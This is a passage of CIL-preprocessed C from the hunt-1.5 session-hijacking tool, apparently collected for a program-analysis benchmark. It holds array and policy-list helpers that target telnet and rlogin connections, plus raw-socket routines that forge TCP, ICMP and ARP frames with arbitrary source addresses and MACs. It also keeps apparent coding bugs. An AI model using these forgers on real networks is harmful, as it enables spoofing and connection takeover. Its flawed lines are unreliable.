#line 98 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
void *array_remove(struct array *a , void *m ) 
{ 
  struct array_item *ai ;
  void *retval ;

  {
  {
#line 103
  __lock(a);
  }
#line 104
  if (! m) {
#line 105
    retval = (void *)0;
  } else {
#line 107
    retval = (void *)0;
#line 108
    ai = a->a_arr;
    {
#line 108
    while (1) {
      while_continue: /* CIL Label */ ;
#line 108
      if (! ((unsigned long )ai < (unsigned long )(a->a_arr + a->a_size))) {
#line 108
        goto while_break;
      }
#line 109
      if ((unsigned long )ai->ai_data == (unsigned long )m) {
#line 110
        ai->ai_data = (void *)0;
#line 111
        (a->a_items) --;
#line 112
        retval = m;
#line 113
        goto while_break;
      }
#line 108
      ai ++;
    }
    while_break: /* CIL Label */ ;
    }
  }
  {
#line 116
  __unlock(a);
  }
#line 117
  return (retval);
}
}
#line 120 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
static void need_space(struct array *a ) 
{ 
  int new_size ;
  struct array_item *new_arr ;
  void *tmp ;

  {
#line 125
  if (a->a_items == a->a_size) {
    {
#line 126
    new_size = a->a_size + (50 * a->a_size) / 100;
#line 127
    tmp = realloc((void *)a->a_arr, (unsigned long )new_size * sizeof(struct array_item ));
#line 127
    new_arr = (struct array_item *)tmp;
    }
#line 128
    if (! new_arr) {
      {
#line 128
      __assert_fail("new_arr", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c",
                    128U, "need_space");
      }
    }
    {
#line 129
    memset((void *)(a->a_arr + a->a_size), 0, (unsigned long )(new_size - a->a_size) * sizeof(struct array_item ));
#line 130
    a->a_arr = new_arr;
#line 131
    a->a_size = new_size;
    }
  }
#line 133
  return;
}
}
#line 135 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
int array_put(struct array *a , void *m ) 
{ 
  struct array_item *ai ;
  int retval ;

  {
  {
#line 140
  __lock(a);
#line 141
  need_space(a);
#line 142
  ai = a->a_arr;
  }
  {
#line 142
  while (1) {
    while_continue: /* CIL Label */ ;
#line 142
    if (! ((unsigned long )ai < (unsigned long )(a->a_arr + a->a_size))) {
#line 142
      goto while_break;
    }
#line 143
    if ((unsigned long )ai->ai_data == (unsigned long )((void *)0)) {
#line 144
      ai->ai_data = m;
#line 145
      (a->a_items) ++;
#line 146
      goto while_break;
    }
#line 142
    ai ++;
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 149
  retval = (int )(ai - a->a_arr);
#line 150
  __unlock(a);
  }
#line 151
  return (retval);
}
}
#line 154 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
void *array_pop(struct array *a ) 
{ 
  struct array_item *ai ;
  void *retval ;

  {
  {
#line 157
  retval = (void *)0;
#line 159
  __lock(a);
#line 160
  ai = a->a_arr;
  }
  {
#line 160
  while (1) {
    while_continue: /* CIL Label */ ;
#line 160
    if (! ((unsigned long )ai < (unsigned long )(a->a_arr + a->a_size))) {
#line 160
      goto while_break;
    }
#line 161
    if (ai->ai_data) {
#line 162
      retval = ai->ai_data;
#line 163
      ai->ai_data = (void *)0;
#line 164
      (a->a_items) --;
#line 165
      goto while_break;
    }
#line 160
    ai ++;
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 168
  __unlock(a);
  }
#line 169
  return (retval);
}
}
#line 172 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
int array_count(struct array *a ) 
{ 
  int retval ;

  {
  {
#line 176
  __lock(a);
#line 177
  retval = a->a_items;
#line 178
  __unlock(a);
  }
#line 179
  return (retval);
}
}
#line 182 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
void array_lock(struct array *a ) 
{ 
  pthread_t tmp ;

  {
#line 185
  if (! a->a_locked) {
    {
#line 186
    pthread_mutex_lock(& a->a_mutex);
#line 187
    a->a_locked_thr = pthread_self();
#line 188
    a->a_locked = 1;
    }
  } else {
    {
#line 185
    tmp = pthread_self();
    }
#line 185
    if (a->a_locked_thr != tmp) {
      {
#line 186
      pthread_mutex_lock(& a->a_mutex);
#line 187
      a->a_locked_thr = pthread_self();
#line 188
      a->a_locked = 1;
      }
    } else {
#line 190
      (a->a_locked) ++;
    }
  }
#line 192
  return;
}
}
#line 194 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
void array_unlock(struct array *a ) 
{ 


  {
#line 197
  (a->a_locked) --;
#line 197
  if (a->a_locked == 0) {
    {
#line 198
    pthread_mutex_unlock(& a->a_mutex);
    }
  }
#line 200
  return;
}
}
#line 202 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
void array_iter_lock(struct array_iterator *ai ) 
{ 


  {
  {
#line 204
  array_lock(ai->i_array);
  }
#line 205
  return;
}
}
#line 207 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
void array_iter_unlock(struct array_iterator *ai ) 
{ 


  {
  {
#line 209
  array_unlock(ai->i_array);
  }
#line 210
  return;
}
}
#line 212 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
void array_iter_set(struct array_iterator *ai , struct array *a ) 
{ 


  {
#line 214
  ai->i_array = a;
#line 215
  ai->i_pos = -1;
#line 216
  return;
}
}
#line 218 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
void *array_iter_get(struct array_iterator *ai ) 
{ 
  struct array *a ;
  void *retval ;

  {
  {
#line 223
  retval = (void *)0;
#line 224
  a = ai->i_array;
#line 225
  __lock(a);
  }
  {
#line 226
  while (1) {
    while_continue: /* CIL Label */ ;
#line 226
    (ai->i_pos) ++;
#line 226
    if (! (ai->i_pos < a->a_size)) {
#line 226
      goto while_break;
    }
#line 227
    if ((a->a_arr + ai->i_pos)->ai_data) {
#line 228
      retval = (a->a_arr + ai->i_pos)->ai_data;
#line 229
      goto while_break;
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 232
  __unlock(a);
  }
#line 233
  return (retval);
}
}
#line 236 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/array.c"
void array_iter_end(struct array_iterator *ai ) 
{ 


  {
#line 238
  ai->i_array = (struct array *)((void *)0);
#line 239
  ai->i_pos = -1;
#line 240
  return;
}
}
#line 592 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct list l_add_policy ;
#line 593
int conn_add_match(unsigned int src_addr , unsigned int dst_addr , unsigned short src_port ,
                   unsigned short dst_port ) ;
#line 595
int conn_add_policy(struct iphdr *iph , struct tcphdr *tcph ) ;
#line 596
void add_telnet_rlogin_policy(void) ;
#line 597
void addpolicy_list_items(void) ;
#line 598
void addpolicy_add_item(void) ;
#line 599
void addpolicy_mod_item(void) ;
#line 600
void addpolicy_del_item(void) ;
#line 16 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/addpolicy.c"
struct list l_add_policy  = 
#line 16 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/addpolicy.c"
     {(void *)0, (void *)0, (int )((char *)(& ((struct add_policy_info *)0)->next) - (char *)0),
    0, (struct list_iterator *)((void *)0), 0, {{0, 0U, 0, 0U, 0, (short)0, (short)0,
                                                 {(struct __pthread_internal_list *)0,
                                                  (struct __pthread_internal_list *)0}}},
    {{0, 0U, 0ULL, 0ULL, 0ULL, (void *)0, 0U, 0U}}, (pthread_t )0};
#line 19 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/addpolicy.c"
int conn_add_match(unsigned int src_addr , unsigned int dst_addr , unsigned short src_port ,
                   unsigned short dst_port ) 
{ 
  struct list_iterator li ;
  struct add_policy_info *api ;
  int retval ;
  int tmp ;
  int tmp___0 ;
  int tmp___1 ;
  int tmp___2 ;
  void *tmp___3 ;

  {
  {
#line 24
  retval = 0;
#line 26
  list_lock(& l_add_policy);
#line 27
  list_iter_set(& li, & l_add_policy);
  }
  {
#line 28
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 28
    tmp___3 = list_iter_get(& li);
#line 28
    api = (struct add_policy_info *)tmp___3;
    }
#line 28
    if (! api) {
#line 28
      goto while_break;
    }
#line 29
    if ((src_addr & api->src_mask) == api->src_addr) {
#line 29
      if ((dst_addr & api->dst_mask) == api->dst_addr) {
        {
#line 29
        tmp = port_match((int )src_port, api->src_ports);
        }
#line 29
        if (tmp) {
          {
#line 29
          tmp___0 = port_match((int )dst_port, api->dst_ports);
          }
#line 29
          if (tmp___0) {
#line 33
            retval = 1;
#line 34
            goto while_break;
          }
        }
      }
    }
#line 36
    if ((src_addr & api->src_mask) == api->dst_addr) {
#line 36
      if ((dst_addr & api->dst_mask) == api->src_addr) {
        {
#line 36
        tmp___1 = port_match((int )src_port, api->dst_ports);
        }
#line 36
        if (tmp___1) {
          {
#line 36
          tmp___2 = port_match((int )dst_port, api->src_ports);
          }
#line 36
          if (tmp___2) {
#line 40
            retval = 1;
#line 41
            goto while_break;
          }
        }
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 44
  list_iter_end(& li);
#line 45
  list_unlock(& l_add_policy);
  }
#line 46
  return (retval);
}
}
#line 49 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/addpolicy.c"
int conn_add_policy(struct iphdr *iph , struct tcphdr *tcph ) 
{ 
  int tmp ;

  {
  {
#line 51
  tmp = conn_add_match(iph->saddr, iph->daddr, tcph->__annonCompField3.__annonCompField2.source,
                       tcph->__annonCompField3.__annonCompField2.dest);
  }
#line 51
  return (tmp);
}
}
#line 54 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/addpolicy.c"
void add_telnet_rlogin_policy(void) 
{ 
  struct add_policy_info *api ;
  void *tmp ;
  uint16_t tmp___0 ;
  uint16_t tmp___1 ;

  {
  {
#line 58
  tmp = malloc(sizeof(struct add_policy_info ));
#line 58
  api = (struct add_policy_info *)tmp;
  }
#line 59
  if (! api) {
    {
#line 59
    __assert_fail("api", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/addpolicy.c",
                  59U, "add_telnet_rlogin_policy");
    }
  }
  {
#line 60
  memset((void *)api, 0, sizeof(sizeof(struct add_policy_info )));
#line 61
  api->src_addr = 0U;
#line 62
  api->src_mask = 0U;
#line 63
  api->dst_addr = 0U;
#line 64
  api->dst_mask = 0U;
#line 65
  api->src_ports[0] = 0U;
#line 66
  tmp___0 = htons((uint16_t )23);
#line 66
  api->dst_ports[0] = (unsigned int )tmp___0;
#line 67
  tmp___1 = htons((uint16_t )513);
#line 67
  api->dst_ports[1] = (unsigned int )tmp___1;
#line 68
  api->dst_ports[2] = 0U;
#line 69
  list_push(& l_add_policy, (void *)api);
  }
#line 70
  return;
}
}
#line 72 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/addpolicy.c"
static void addpolicy_item_print(int i , struct add_policy_info *api ) 
{ 
  char buf_src_ports[512] ;
  char buf_dst_ports[512] ;
  char host_buf[512] ;
  int tmp ;
  char *tmp___0 ;
  int tmp___1 ;
  char *tmp___2 ;

  {
  {
#line 77
  sprintf_db_ports(api->src_ports, buf_src_ports, (int )sizeof(buf_src_ports), 1);
#line 78
  sprintf_db_ports(api->dst_ports, buf_dst_ports, (int )sizeof(buf_dst_ports), 1);
#line 79
  tmp = count_mask(api->src_mask);
#line 79
  tmp___0 = host_lookup(api->src_addr, hl_mode);
#line 79
  sprintf((char */* __restrict  */)(host_buf), (char const   */* __restrict  */)"%s/%d [%s]",
          tmp___0, tmp, buf_src_ports);
#line 81
  tmp___1 = count_mask(api->dst_mask);
#line 81
  tmp___2 = host_lookup(api->dst_addr, hl_mode);
#line 81
  printf((char const   */* __restrict  */)"%2d) %-32s <--> %s/%d [%s]\n", i, host_buf,
         tmp___2, tmp___1, buf_dst_ports);
  }
#line 85
  return;
}
}
#line 87 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/addpolicy.c"
void addpolicy_list_items(void) 
{ 
  struct list_iterator li ;
  struct add_policy_info *api ;
  int i ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 91
  i = 0;
#line 93
  list_iter_set(& li, & l_add_policy);
  }
  {
#line 94
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 94
    tmp___0 = list_iter_get(& li);
#line 94
    api = (struct add_policy_info *)tmp___0;
    }
#line 94
    if (! api) {
#line 94
      goto while_break;
    }
    {
#line 95
    tmp = i;
#line 95
    i ++;
#line 95
    addpolicy_item_print(tmp, api);
    }
#line 96
    if (i % lines_o == 0) {
      {
#line 97
      lines_o_press_key();
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 99
  list_iter_end(& li);
  }
#line 100
  return;
}
}
#line 103 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/addpolicy.c"
void addpolicy_add_item(void) 
{ 
  struct add_policy_info *api ;
  unsigned int src_ip ;
  unsigned int dst_ip ;
  unsigned int src_mask ;
  unsigned int dst_mask ;
  int src_ports[17] ;
  int dst_ports[17] ;
  int nr ;
  int tmp ;
  int tmp___0 ;
  int tmp___1 ;
  int tmp___2 ;
  void *tmp___3 ;

  {
  {
#line 112
  tmp = menu_choose_host_mask_ports_dfl((char *)"src ip addr/mask ports", & src_ip,
                                        & src_mask, (unsigned int *)(src_ports), 0U,
                                        0U, (int *)((void *)0));
  }
#line 112
  if (tmp < 0) {
#line 114
    return;
  }
  {
#line 115
  tmp___0 = menu_choose_host_mask_ports_dfl((char *)"dst ip addr/mask ports", & dst_ip,
                                            & dst_mask, (unsigned int *)(dst_ports),
                                            0U, 0U, (int *)((void *)0));
  }
#line 115
  if (tmp___0 < 0) {
#line 117
    return;
  }
  {
#line 118
  tmp___1 = list_count(& l_add_policy);
#line 118
  tmp___2 = list_count(& l_add_policy);
#line 118
  nr = menu_choose_unr((char *)"insert at", 0, tmp___2, tmp___1);
  }
#line 118
  if (nr == -1) {
#line 119
    return;
  }
  {
#line 121
  tmp___3 = malloc(sizeof(struct add_policy_info ));
#line 121
  api = (struct add_policy_info *)tmp___3;
#line 122
  memset((void *)api, 0, sizeof(struct add_policy_info ));
#line 123
  api->src_addr = src_ip;
#line 124
  api->src_mask = src_mask;
#line 125
  port_htons((unsigned int *)(src_ports));
#line 126
  memcpy((void */* __restrict  */)(api->src_ports), (void const   */* __restrict  */)(src_ports),
         sizeof(int ) * 17UL);
#line 127
  api->dst_addr = dst_ip;
#line 128
  api->dst_mask = dst_mask;
#line 129
  port_htons((unsigned int *)(dst_ports));
#line 130
  memcpy((void */* __restrict  */)(api->dst_ports), (void const   */* __restrict  */)(dst_ports),
         sizeof(int ) * 17UL);
#line 131
  list_lock(& l_add_policy);
#line 132
  list_insert_at(& l_add_policy, nr, (void *)api);
#line 133
  list_unlock(& l_add_policy);
  }
#line 134
  return;
}
}
#line 136 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/addpolicy.c"
void addpolicy_mod_item(void) 
{ 
  struct add_policy_info *api ;
  unsigned int src_ip ;
  unsigned int dst_ip ;
  unsigned int src_mask ;
  unsigned int dst_mask ;
  int src_ports[17] ;
  int dst_ports[17] ;
  int nr ;
  int tmp ;
  int tmp___0 ;
  void *tmp___1 ;
  int tmp___2 ;
  int tmp___3 ;

  {
  {
#line 144
  addpolicy_list_items();
#line 145
  tmp = list_count(& l_add_policy);
#line 145
  tmp___0 = list_count(& l_add_policy);
#line 145
  nr = menu_choose_unr((char *)"choose item", 0, tmp___0 - 1, tmp - 1);
  }
#line 145
  if (nr == -1) {
#line 146
    return;
  }
  {
#line 147
  tmp___1 = list_at(& l_add_policy, nr);
#line 147
  api = (struct add_policy_info *)tmp___1;
  }
#line 147
  if (! api) {
#line 148
    return;
  }
  {
#line 149
  tmp___2 = menu_choose_host_mask_ports_dfl((char *)"src ip addr/mask ports", & src_ip,
                                            & src_mask, (unsigned int *)(src_ports),
                                            api->src_addr, api->src_mask, (int *)(api->src_ports));
  }
#line 149
  if (tmp___2 < 0) {
#line 152
    return;
  }
  {
#line 153
  tmp___3 = menu_choose_host_mask_ports_dfl((char *)"dst ip addr/mask ports", & dst_ip,
                                            & dst_mask, (unsigned int *)(dst_ports),
                                            api->dst_addr, api->dst_mask, (int *)(api->dst_ports));
  }
#line 153
  if (tmp___3 < 0) {
#line 156
    return;
  }
  {
#line 157
  port_htons((unsigned int *)(src_ports));
#line 158
  port_htons((unsigned int *)(dst_ports));
#line 159
  list_lock(& l_add_policy);
#line 160
  api->src_addr = src_ip;
#line 161
  api->src_mask = src_mask;
#line 162
  memcpy((void */* __restrict  */)(api->src_ports), (void const   */* __restrict  */)(src_ports),
         sizeof(int ) * 17UL);
#line 163
  api->dst_addr = dst_ip;
#line 164
  api->dst_mask = dst_mask;
#line 165
  memcpy((void */* __restrict  */)(api->dst_ports), (void const   */* __restrict  */)(dst_ports),
         sizeof(int ) * 17UL);
#line 166
  list_unlock(& l_add_policy);
  }
#line 167
  return;
}
}
#line 169 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/addpolicy.c"
void addpolicy_del_item(void) 
{ 
  int i ;
  struct add_policy_info *api ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 174
  addpolicy_list_items();
#line 175
  tmp = list_count(& l_add_policy);
#line 175
  i = menu_choose_unr((char *)"item nr. to delete", 0, tmp - 1, -1);
  }
#line 177
  if (i >= 0) {
    {
#line 178
    list_lock(& l_add_policy);
#line 179
    tmp___0 = list_remove_at(& l_add_policy, i);
#line 179
    api = (struct add_policy_info *)tmp___0;
#line 180
    list_unlock(& l_add_policy);
#line 181
    free((void *)api);
    }
  }
#line 183
  return;
}
}
#line 184 "/usr/include/x86_64-linux-gnu/sys/socket.h"
extern ssize_t sendmsg(int __fd , struct msghdr  const  *__message , int __flags ) ;
#line 259 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
int linksock ;
#line 419
unsigned short ip_in_cksum(struct iphdr *iph , unsigned short *ptr , int nbytes ) ;
#line 420
unsigned short in_cksum(unsigned short *ptr , int nbytes ) ;
#line 696
int send_icmp_packet(struct icmp_spec *is ) ;
#line 50 "/usr/include/x86_64-linux-gnu/bits/errno.h"
extern  __attribute__((__nothrow__)) int *( __attribute__((__leaf__)) __errno_location)(void)  __attribute__((__const__)) ;
#line 17 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/net.c"
int Sendmsg(int s , struct msghdr  const  *msg , unsigned int flags ) 
{ 
  int retval ;
  int retry_count ;
  struct timespec ts ;
  ssize_t tmp ;
  int *tmp___0 ;
  int *tmp___1 ;

  {
#line 20
  retry_count = 0;
  retry: 
  {
#line 24
  tmp = sendmsg(s, msg, (int )flags);
#line 24
  retval = (int )tmp;
  }
#line 25
  if (retval < 0) {
    {
#line 25
    tmp___0 = __errno_location();
    }
#line 25
    if (*tmp___0 == 105) {
#line 25
      if (retry_count < 5) {
        {
#line 26
        ts.tv_sec = (__time_t )0;
#line 27
        ts.tv_nsec = (__syscall_slong_t )10000000;
#line 28
        nanosleep((struct timespec  const  *)(& ts), (struct timespec *)((void *)0));
#line 29
        retry_count ++;
        }
#line 30
        goto retry;
      }
    }
  }
#line 32
  if (retval < 0) {
    {
#line 33
    tmp___1 = __errno_location();
#line 33
    fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"sendmsg retval = %d errno = %d\n",
            retval, *tmp___1);
    }
  }
#line 34
  return (retval);
}
}
#line 37 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/net.c"
int send_tcp_packet(struct tcp_spec *ts ) 
{ 
  int tot_len ;
  int retval ;
  char buf[2048] ;
  char *data ;
  struct ethhdr *eth ;
  struct iphdr *ip ;
  struct tcphdr *tcp ;
  struct msghdr msg ;
  struct sockaddr spkt ;
  struct iovec iov ;

  {
  {
#line 48
  eth = (struct ethhdr *)(buf);
#line 49
  memcpy((void */* __restrict  */)(eth->h_dest), (void const   */* __restrict  */)ts->dst_mac,
         (size_t )6);
#line 50
  memcpy((void */* __restrict  */)(eth->h_source), (void const   */* __restrict  */)ts->src_mac,
         (size_t )6);
#line 51
  eth->h_proto = htons((uint16_t )2048);
#line 53
  ip = (struct iphdr *)(eth + 1);
#line 54
  tcp = (struct tcphdr *)(ip + 1);
#line 55
  data = (char *)(tcp + 1);
#line 56
  memset((void *)ip, 0, sizeof(struct iphdr ));
#line 57
  memset((void *)tcp, 0, sizeof(struct tcphdr ));
#line 58
  memcpy((void */* __restrict  */)data, (void const   */* __restrict  */)ts->data,
         (size_t )ts->data_len);
#line 59
  tcp->__annonCompField3.__annonCompField2.dest = ts->dport;
#line 60
  tcp->__annonCompField3.__annonCompField2.source = ts->sport;
#line 61
  tcp->__annonCompField3.__annonCompField2.doff = (u_int16_t )5;
#line 62
  tcp->__annonCompField3.__annonCompField2.psh = (u_int16_t )ts->psh;
#line 63
  tcp->__annonCompField3.__annonCompField2.ack = (u_int16_t )ts->ack;
#line 64
  tcp->__annonCompField3.__annonCompField2.rst = (u_int16_t )ts->rst;
#line 65
  tcp->__annonCompField3.__annonCompField2.window = ts->window;
#line 66
  ip->version = 4U;
#line 67
  ip->ihl = 5U;
#line 68
  tot_len = 40 + ts->data_len;
#line 69
  ip->tot_len = htons((uint16_t )tot_len);
#line 70
  ip->ttl = (u_int8_t )64;
#line 71
  ip->protocol = (u_int8_t )6;
#line 72
  ip->frag_off = htons((uint16_t )16384);
#line 73
  ip->saddr = (u_int32_t )ts->saddr;
#line 74
  ip->daddr = (u_int32_t )ts->daddr;
#line 75
  ip->id = ts->id;
#line 76
  ip->check = (u_int16_t )0;
#line 77
  ip->check = in_cksum((unsigned short *)ip, 20);
#line 78
  tcp->__annonCompField3.__annonCompField2.seq = (u_int32_t )ts->seq;
  }
#line 79
  if (ts->ack) {
#line 80
    tcp->__annonCompField3.__annonCompField2.ack_seq = (u_int32_t )ts->ack_seq;
  }
  {
#line 81
  tcp->__annonCompField3.__annonCompField2.check = (u_int16_t )0;
#line 82
  tcp->__annonCompField3.__annonCompField2.check = ip_in_cksum(ip, (unsigned short *)tcp,
                                                               (int )(sizeof(struct tcphdr ) + (unsigned long )ts->data_len));
#line 84
  memset((void *)(& spkt), 0, sizeof(spkt));
#line 85
  strncpy((char */* __restrict  */)(spkt.sa_data), (char const   */* __restrict  */)eth_device,
          sizeof(spkt.sa_data));
#line 87
  memset((void *)(& msg), 0, sizeof(msg));
#line 88
  msg.msg_name = (void *)(& spkt);
#line 89
  msg.msg_namelen = (socklen_t )sizeof(spkt);
#line 90
  msg.msg_iovlen = (size_t )1;
#line 91
  msg.msg_iov = & iov;
#line 92
  iov.iov_base = (void *)(buf);
#line 93
  iov.iov_len = sizeof(struct ethhdr ) + (unsigned long )tot_len;
#line 95
  retval = Sendmsg(linksock, (struct msghdr  const  *)(& msg), 0U);
  }
#line 96
  return (retval);
}
}
#line 99 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/net.c"
int send_icmp_packet(struct icmp_spec *is ) 
{ 
  int tot_len ;
  int retval ;
  char buf[2048] ;
  char *data ;
  struct ethhdr *eth ;
  struct iphdr *ip ;
  struct icmphdr *icmp ;
  struct msghdr msg ;
  struct sockaddr spkt ;
  struct iovec iov ;
  int data_len ;

  {
  {
#line 111
  eth = (struct ethhdr *)(buf);
#line 112
  memcpy((void */* __restrict  */)(eth->h_dest), (void const   */* __restrict  */)is->dst_mac,
         (size_t )6);
#line 113
  memcpy((void */* __restrict  */)(eth->h_source), (void const   */* __restrict  */)is->src_mac,
         (size_t )6);
#line 114
  eth->h_proto = htons((uint16_t )2048);
#line 116
  ip = (struct iphdr *)(eth + sizeof(struct ethhdr ));
#line 117
  icmp = (struct icmphdr *)(ip + sizeof(struct iphdr ));
#line 118
  data = (char *)(icmp + sizeof(struct icmphdr ));
#line 119
  memset((void *)ip, 0, sizeof(struct iphdr ));
#line 120
  memset((void *)icmp, 0, sizeof(struct icmphdr ));
  }
#line 121
  if (! is->data_len) {
    {
#line 122
    memset((void *)data, 0, (size_t )64);
#line 123
    data_len = 64;
    }
  } else {
    {
#line 125
    memcpy((void */* __restrict  */)data, (void const   */* __restrict  */)is->data,
           (size_t )is->data_len);
#line 126
    data_len = is->data_len;
    }
  }
  {
#line 128
  ip->version = 4U;
#line 129
  ip->ihl = 5U;
#line 130
  tot_len = (int )((20UL + sizeof(struct icmphdr )) + (unsigned long )data_len);
#line 131
  ip->tot_len = htons((uint16_t )tot_len);
#line 132
  ip->ttl = (u_int8_t )64;
#line 133
  ip->protocol = (u_int8_t )1;
#line 134
  ip->saddr = is->src_addr;
#line 135
  ip->daddr = is->dst_addr;
#line 136
  ip->frag_off = htons((uint16_t )16384);
#line 137
  ip->id = (u_int16_t )0;
#line 138
  ip->check = (u_int16_t )0;
#line 139
  ip->check = in_cksum((unsigned short *)ip, 20);
  }
#line 141
  if (! (sizeof(struct icmphdr ) == 8UL)) {
    {
#line 141
    __assert_fail("sizeof(struct icmphdr) == 8", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/net.c",
                  141U, "send_icmp_packet");
    }
  }
  {
#line 142
  icmp->type = (u_int8_t )is->type;
#line 143
  icmp->code = (u_int8_t )is->code;
#line 144
  icmp->un.gateway = is->un.res;
#line 146
  icmp->checksum = (u_int16_t )0;
#line 147
  icmp->checksum = in_cksum((unsigned short *)icmp, (int )(sizeof(struct icmphdr ) + (unsigned long )data_len));
#line 150
  memset((void *)(& spkt), 0, sizeof(spkt));
#line 151
  strncpy((char */* __restrict  */)(spkt.sa_data), (char const   */* __restrict  */)eth_device,
          sizeof(spkt.sa_data));
#line 153
  memset((void *)(& msg), 0, sizeof(msg));
#line 154
  msg.msg_name = (void *)(& spkt);
#line 155
  msg.msg_namelen = (socklen_t )sizeof(spkt);
#line 156
  msg.msg_iovlen = (size_t )1;
#line 157
  msg.msg_iov = & iov;
#line 158
  iov.iov_base = (void *)(buf);
#line 159
  iov.iov_len = sizeof(struct ethhdr ) + (unsigned long )tot_len;
#line 160
  retval = Sendmsg(linksock, (struct msghdr  const  *)(& msg), 0U);
  }
#line 161
  return (retval);
}
}
#line 164 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/net.c"
void send_icmp_request(unsigned int src_addr , unsigned int dst_addr , char *src_mac ,
                       char *dst_mac , unsigned short seq ) 
{ 
  struct icmp_spec icmp ;

  {
  {
#line 169
  icmp.src_addr = src_addr;
#line 170
  icmp.dst_addr = dst_addr;
#line 171
  icmp.src_mac = src_mac;
#line 172
  icmp.dst_mac = dst_mac;
#line 173
  icmp.type = (short)8;
#line 174
  icmp.code = (short)0;
#line 175
  icmp.un.idseq.id = htons((uint16_t )170);
#line 176
  icmp.un.idseq.seq = seq;
#line 177
  icmp.data = (void *)0;
#line 178
  icmp.data_len = 0;
#line 180
  send_icmp_packet(& icmp);
  }
#line 181
  return;
}
}
#line 183 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/net.c"
int is_icmp_reply(struct packet *p , unsigned int src_addr , unsigned int dst_addr ,
                  char *src_mac , char *dst_mac ) 
{ 
  struct iphdr *iph ;
  struct icmphdr *icmph ;
  struct ethhdr *ethh ;
  unsigned short seq ;
  unsigned short id ;
  uint16_t tmp ;
  int tmp___0 ;
  int tmp___1 ;

  {
#line 186
  iph = p->p_iph;
#line 187
  icmph = p->p_hdr.p_icmph;
#line 188
  ethh = p->p_ethh;
#line 191
  if (iph->saddr == src_addr) {
#line 191
    if (iph->daddr == dst_addr) {
#line 191
      if ((int )icmph->type == 0) {
#line 191
        if ((int )icmph->code == 0) {
          {
#line 194
          seq = (unsigned short )((icmph->un.gateway & 4294901760U) >> 16);
#line 195
          id = (unsigned short )(icmph->un.gateway & 65535U);
#line 197
          tmp = htons((uint16_t )170);
          }
#line 197
          if ((int )id != (int )tmp) {
#line 198
            return (0);
          }
          {
#line 200
          tmp___0 = memcmp((void const   *)(ethh->h_dest), (void const   *)dst_mac,
                           (size_t )6);
          }
#line 200
          if (tmp___0 == 0) {
            {
#line 200
            tmp___1 = memcmp((void const   *)(ethh->h_source), (void const   *)src_mac,
                             (size_t )6);
            }
#line 200
            if (tmp___1 == 0) {
#line 202
              return (1);
            } else {
#line 204
              return (2);
            }
          } else {
#line 204
            return (2);
          }
        }
      }
    }
  }
#line 206
  return (0);
}
}
#line 209 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/net.c"
int send_arp_packet(struct arp_spec *as ) 
{ 
  t_longchar tmp ;
  int i ;
  char buf[512] ;
  int retval ;
  int data_len ;
  struct msghdr msg ;
  struct iovec iov ;
  struct ethhdr *eth ;
  struct arphdr *arp ;
  struct arpeth_hdr *arpeth ;
  struct sockaddr spkt ;

  {
  {
#line 223
  eth = (struct ethhdr *)(buf);
#line 224
  memcpy((void */* __restrict  */)(eth->h_dest), (void const   */* __restrict  */)as->dst_mac,
         (size_t )6);
#line 225
  memcpy((void */* __restrict  */)(eth->h_source), (void const   */* __restrict  */)as->src_mac,
         (size_t )6);
#line 226
  eth->h_proto = htons((uint16_t )2054);
#line 228
  arp = (struct arphdr *)(eth + 1);
#line 229
  arp->ar_hrd = htons((uint16_t )1);
#line 230
  arp->ar_pro = htons((uint16_t )2048);
#line 231
  arp->ar_hln = (unsigned char)6;
#line 232
  arp->ar_pln = (unsigned char)4;
#line 233
  arp->ar_op = (unsigned short )as->oper;
#line 235
  arpeth = (struct arpeth_hdr *)(arp + 1);
#line 236
  memcpy((void */* __restrict  */)(arpeth->ar_sha), (void const   */* __restrict  */)as->sender_mac,
         (size_t )6);
#line 237
  tmp.val = as->sender_addr;
#line 238
  i = 0;
  }
  {
#line 238
  while (1) {
    while_continue: /* CIL Label */ ;
#line 238
    if (! (i < 4)) {
#line 238
      goto while_break;
    }
#line 239
    arpeth->ar_sip[i] = (unsigned char )tmp.buff[i];
#line 238
    i ++;
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 240
